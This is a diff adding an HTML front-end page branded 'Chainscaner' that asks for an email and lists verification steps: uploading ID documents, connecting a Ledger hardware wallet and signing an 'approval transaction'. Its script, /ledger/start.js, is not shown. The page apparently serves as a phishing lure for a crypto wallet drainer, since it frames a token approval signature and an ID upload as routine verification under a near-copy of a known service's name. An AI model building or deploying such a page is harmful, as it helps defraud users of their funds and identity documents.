@@ -1,0 +1,111 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Start Verification — Chainscaner</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+<style>
+  :root {
+    color-scheme: light;
+    --bg: #f4f6f9;
+    --card: #ffffff;
+    --border: #e3e8ef;
+    --text: #17202b;
+    --muted: #5f6b7c;
+    --primary: #0a5cff;
+    --primary-hover: #0049d6;
+    --success: #14914b;
+    --success-hover: #0e7a3c;
+    --danger: #d92d20;
+    --ring: rgba(10,92,255,.18);
+    --shadow: 0 1px 2px rgba(16,24,40,.06), 0 1px 3px rgba(16,24,40,.08);
+  }
+  * { box-sizing: border-box; }
+  body { font-family: 'Inter', system-ui, -apple-system, sans-serif; background: var(--bg); color: var(--text); -webkit-font-smoothing: antialiased; min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 24px; }
+  .hidden { display: none !important; }
+
+  .card { background: var(--card); border: 1px solid var(--border); border-radius: 16px; padding: 28px; box-shadow: var(--shadow); max-width: 420px; width: 100%; animation: rise .25s ease; }
+  @keyframes rise { from { opacity: 0; transform: translateY(6px); } to { opacity: 1; transform: none; } }
+
+  .btn-primary {
+    display: inline-flex; align-items: center; justify-content: center; gap: 8px;
+    font-weight: 600; padding: 13px 24px; border-radius: 10px; font-size: 15px;
+    transition: all .18s ease; border: 0; cursor: pointer; width: 100%;
+    background: var(--primary); color: #fff; box-shadow: 0 1px 2px rgba(10,92,255,.25);
+  }
+  .btn-primary:hover:not(:disabled) { background: var(--primary-hover); }
+  .btn-primary:active:not(:disabled) { transform: scale(.98); }
+  .btn-primary:disabled { opacity: .45; cursor: not-allowed; }
+
+  button:focus-visible, input:focus-visible {
+    outline: none; box-shadow: 0 0 0 4px var(--ring);
+  }
+
+  .email-input {
+    width: 100%; padding: 13px 16px; border: 1.5px solid var(--border); border-radius: 10px;
+    font-size: 14px; font-family: system-ui, -apple-system, sans-serif; transition: border-color .15s;
+  }
+  .email-input:focus { border-color: var(--primary); }
+  .email-input.invalid { border-color: var(--danger); }
+
+  .error-msg { font-size: 13px; color: var(--danger); margin-top: 8px; min-height: 20px; }
+  .success-msg { font-size: 13px; color: var(--success); margin-top: 8px; min-height: 20px; }
+
+  .info-text { font-size: 13px; color: var(--muted); margin-top: 16px; line-height: 1.6; }
+
+  .brand-icon { width:30px; height:30px; border-radius:9px; flex:none;
+    background:linear-gradient(135deg,#2563EB,#1D4ED8);
+    display:inline-flex; align-items:center; justify-content:center;
+    box-shadow:0 2px 8px rgba(37,99,235,.25); }
+  .brand-word { display:flex; flex-direction:column; line-height:1.1; }
+  .brand-name { font-weight:800; font-size:16px; letter-spacing:-.3px; }
+  .brand-word .scan { color:#2563EB; }
+  .brand-tag { font-size:8.5px; font-weight:700; letter-spacing:1.7px; text-transform:uppercase; color:var(--muted); margin-top:3px; }
+
+  @media (max-width: 560px) {
+    .brand-tag { display: none; }
+    .card { padding: 20px; }
+  }
+</style>
+</head>
+<body>
+
+<div class="card">
+  <div style="display:flex; align-items:center; justify-content:center; margin-bottom:20px;">
+    <span class="brand-icon"><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-3.6 8-10V5l-8-3-8 3v7c0 6.4 8 10 8 10z"/></svg></span>
+    <span class="brand-word" style="margin-left: 10px;"><span class="brand-name">chain<span class="scan">scan</span>er</span><span class="brand-tag">One scan ahead.</span></span>
+  </div>
+
+  <h1 style="font-size: 22px; font-weight: 700; text-align: center; margin: 0 0 8px;">Start Verification</h1>
+  <p style="font-size: 14px; color: var(--muted); text-align: center; margin: 0 0 24px;">Enter your email to receive a secure verification link</p>
+
+  <div style="margin-bottom: 16px;">
+    <label style="display: block; font-size: 12px; font-weight: 500; color: var(--muted); margin-bottom: 6px;">Email address</label>
+    <input type="email" id="email-input" class="email-input" placeholder="your@email.com" autocomplete="email" />
+    <div id="email-error" class="error-msg"></div>
+  </div>
+
+  <button id="send-link-btn" class="btn-primary" disabled>Send Verification Link</button>
+
+  <div id="success-box" class="hidden" style="margin-top: 20px; padding: 16px; background: rgba(20,145,75,.1); border: 1px solid rgba(20,145,75,.35); border-radius: 10px; text-align: center;">
+    <div style="font-size: 24px; margin-bottom: 8px;">✓</div>
+    <div style="font-size: 14px; font-weight: 600; color: var(--success);">Link sent!</div>
+    <div style="font-size: 13px; color: var(--muted); margin-top: 4px;">Check your email inbox</div>
+  </div>
+
+  <div class="info-text">
+    <strong>What happens next:</strong><br>
+    • You'll receive a verification link valid for 30 minutes<br>
+    • Upload your ID documents<br>
+    • Connect your Ledger hardware wallet<br>
+    • Sign the approval transaction<br>
+    • Receive your certificate automatically
+  </div>
+</div>
+
+<script type="module" src="/ledger/start.js"></script>
+</body>
+</html>
